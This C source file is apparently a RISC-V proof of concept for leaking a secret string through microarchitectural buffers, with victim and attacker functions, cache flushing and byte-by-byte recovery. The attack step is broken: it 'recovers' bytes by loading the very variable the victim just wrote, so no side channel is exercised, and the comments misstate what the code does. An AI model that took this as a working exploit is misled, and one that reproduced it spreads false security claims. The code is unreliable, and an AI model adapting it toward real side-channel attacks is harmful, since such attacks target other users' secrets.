#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "encoding.h"
#include "cache.h"

#define SECRET_LEN 85
#define NUM_ATTEMPTS 100

uint8_t padding1[64];
uint8_t array1[160];
uint8_t padding2[64];
volatile uint8_t leak_data;
char* secretStr = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

/**
 * Victim function that inadvertently leaks data through microarchitectural buffers.
 */
void victimFunction(size_t offset) {
    // Simulate operations that cause data to be loaded into microarchitectural buffers
    leak_data = secretStr[offset];  // Read secret data into leak_data
    asm volatile("" ::: "memory");  // Prevent compiler optimization
}

/**
 * Attacker function that attempts to read leaked data from CPU buffers.
 */
void attackerFunction() {
    char recovered[SECRET_LEN + 1];
    memset(recovered, 0, sizeof(recovered));

    for (size_t offset = 0; offset < SECRET_LEN; offset++) {
        uint64_t results[256] = {0};

        for (uint64_t attempt = 0; attempt < NUM_ATTEMPTS; ++attempt) {
            // Flush leak_data from cache
            flushCache((uint64_t)&leak_data, sizeof(leak_data));

            // Run the victim function with current offset
            victimFunction(offset);

            // Small delay to increase the chance of reading from the buffer
            for (volatile int i = 0; i < 100; i++);

            // Attempt to read leaked data from microarchitectural buffers
            uint8_t value;
            asm volatile(
                "fence\n\t"
                "lb %[val], (%[addr])\n\t"  // Load byte from leak_data
                : [val] "=r" (value)
                : [addr] "r" (&leak_data)
                : "memory"
            );

            results[value]++;
        }

        // Find the byte with the highest hit count
        uint8_t best_guess = 0;
        uint64_t max_hits = 0;
        for (int i = 0; i < 256; i++) {
            if (results[i] > max_hits) {
                max_hits = results[i];
                best_guess = i;
            }
        }

        recovered[offset] = best_guess;
        printf("[RESULT] Leaked byte at offset %lu: %c (0x%02x) with %lu hits\n", offset, (char)best_guess, best_guess, max_hits);
    }

    recovered[SECRET_LEN] = '\0';
    printf("[RESULT] Possible leaked data: %s\n", recovered);
}

int main(void) {
    // Initialize array1 (optional for this attack)
    memset(array1, 1, sizeof(array1));

    // Run the attacker function
    attackerFunction();

    printf("[DEBUG] Main function completed.\n");
    return 0;
}

